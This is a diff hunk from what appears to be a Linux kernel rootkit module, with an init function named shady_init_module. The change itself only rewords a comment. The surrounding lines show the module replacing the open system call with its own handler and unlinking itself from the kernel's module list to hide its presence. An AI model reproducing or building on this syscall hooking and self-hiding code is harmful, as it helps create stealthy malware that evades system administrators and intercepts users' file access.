@@ -292,7 +292,7 @@ shady_init_module(void)
   printk(KERN_INFO "open replaced by my_open addr\n");
 
   /*=======to hide this module=======*/
-  /*delete from list*/
+  /*delete the module from modules list*/
   list_del_init(&__this_module.list); 
   
   return 0; /* success */
